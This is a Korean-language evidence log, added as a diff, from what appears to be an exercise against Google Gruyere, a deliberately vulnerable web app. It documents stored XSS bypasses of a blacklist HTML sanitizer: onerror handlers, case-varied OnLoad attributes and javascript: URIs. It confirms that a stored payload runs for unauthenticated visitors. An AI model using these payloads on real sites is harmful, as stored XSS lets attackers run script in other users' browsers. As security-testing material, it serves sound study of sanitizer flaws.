@@ -1,0 +1,27 @@
+Round 10 — 살균기(sanitize.py) 우회 검증 증거
+================================================================
+[오프라인 단위검사] python3 -c "import sanitize; sanitize.SanitizeHtml(p)"
+  blacklist 누락(onerror)      <img src=x onerror=alert(1)>
+                       → <img src=x onerror=alert(1)>          (원문 그대로 통과)
+  블랙리스트 항목 대소문자 변형  <img src=x OnLoad=alert(1)>
+                       → <img src=x OnLoad=alert(1)>           (원문 그대로 통과)
+  블랙리스트 항목 그대로(onload) <img src=x onload=alert(1)>
+                       → <img src=x blocked=alert(1)>          (소문자만 차단됨 = t.replace 대소문자 구분)
+  허용 태그 a + javascript: URI <a href="javascript:alert(1)">x</a>
+                       → <a href="javascript:alert(1)">x</a>   (스킴 검사 없음)
+  허용 태그 img (핸들러 없음)    <img src=x>
+                       → <img src=x>
+
+[실서버 저장] 내 계정(brie) 스니펫에 저장 → feed.gtl?uid=brie 응답에 원문 보존 확인
+  GET /<gid>/newsnippet2?snippet=<payload>          → HTTP 302
+  저장 페이로드 A2:
+    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" OnLoad="document.title='R10-CASE-BYPASS'">
+  살균기 통과 판정: 입력 == 출력 → True
+
+[브라우저 실행 — 비인증 방문자]
+  URL: https://google-gruyere.appspot.com/399820027374159079597995648128134925001/
+  로그인 여부 마커(editprofile 링크 존재): false   (헤더에 "Sign in | Sign up" 노출 = 비인증)
+  document.title                    : "🐴 R10-CASE-BYPASS"      ← 주입한 OnLoad 핸들러가 실행됨
+  DOM 상 img 요소                    : { src: "data:image/gif;base64,R0lGODlh", hasOnLoad: true,
+                                        onload_attr: "document.title='R10-CASE-BYPASS'" }
+  스크린샷: pages loaded as unauthenticated visitor, title replaced by payload
